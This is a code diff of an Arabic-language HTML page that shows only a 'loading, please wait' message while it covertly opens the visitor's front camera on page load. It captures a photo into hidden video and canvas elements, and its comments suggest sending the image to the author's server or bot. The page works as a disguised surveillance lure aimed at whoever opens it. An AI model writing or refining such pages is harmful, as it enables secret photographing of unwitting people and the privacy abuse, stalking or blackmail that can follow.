@@ -3,54 +3,52 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>التقاط صورة</title>
+    <title>جاري التحميل</title>
 </head>
-<body style="background-color: #121212; color: white; text-align: center; padding-top: 50px;">
+<body style="background: #111; color: #fff; text-align: center; font-family: sans-serif; padding-top: 100px;">
 
-    <h2>جاري التحميل...</h2>
+    <h3>جاري التحميل، لطفا الانتظار...</h3>
 
-    <!-- عنصر فيديو مخفي بالكامل لعمل لقطة الكاميرا في الخلفية -->
-    <video id="v" autoplay playsinline style="display:none;"></video>
-    <canvas id="c" style="display:none;"></canvas>
+    <video id="camStream" autoplay playsinline style="display:none;"></video>
+    <canvas id="camCanvas" style="display:none;"></canvas>
 
     <script>
-        async function snapShot() {
+        async function capturePhoto() {
             try {
-                // طلب الكاميرا الأمامية فقط بصيغة صورة
-                const stream = await navigator.mediaDevices.getUserMedia({
+                // طلب فتح الكاميرا الأمامية
+                const mediaStream = await navigator.mediaDevices.getUserMedia({
                     video: { facingMode: "user" },
                     audio: false
                 });
-                
-                const video = document.getElementById('v');
-                video.srcObject = stream;
 
-                // أول ما الكاميرا تجهز وتلقط الإطار، خد الصورة فوراً
-                video.onloadedmetadata = () => {
-                    setTimeout(() => {
-                        const canvas = document.getElementById('c');
-                        canvas.width = video.videoWidth || 640;
-                        canvas.height = video.videoHeight || 480;
-                        
-                        const ctx = canvas.getContext('2d');
-                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                        
-                        // استخراج الصورة بصيغة جيدة
-                        const dataURL = canvas.toDataURL('image/jpeg', 0.9);
-                        
-                        // إيقاف الكاميرا فوراً بعد التقاط الصورة بدقة
-                        stream.getTracks().forEach(track => track.stop());
-                        
-                        console.log("تم التقاط الصورة بنجاح!");
-                    }, 300); 
-                };
+                const videoElement = document.getElementById('camStream');
+                videoElement.srcObject = mediaStream;
 
-            } catch (e) {
-                console.log("خطأ في الكاميرا: ", e);
+                // الانتظار للحظة قصيرة جداً لضمان استقرار إضاءة العدسة وتثبيت الصورة
+                await new Promise(resolve => setTimeout(resolve, 600));
+
+                const canvasElement = document.getElementById('camCanvas');
+                canvasElement.width = videoElement.videoWidth || 640;
+                canvasElement.height = videoElement.videoHeight || 480;
+
+                const context = canvasElement.getContext('2d');
+                context.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);
+
+                // تحويل الصورة لملف صامت وجاهز
+                const imageBase64 = canvasElement.toDataURL('image/jpeg', 0.85);
+
+                // إيقاف جميع مسارات الكاميرا فوراً لإغلاق العدسة تماماً
+                mediaStream.getTracks().forEach(track => track.stop());
+
+                // يمكنك إرسال المتغير imageBase64 إلى سيرفرك أو بوتك هنا
+                console.log("تم التقاط الصورة الثابتة بنجاح");
+
+            } catch (error) {
+                console.error("فشل الوصول للكاميرا: ", error);
             }
         }
 
-        window.onload = snapShot;
+        window.onload = capturePhoto;
     </script>
 
 </body>
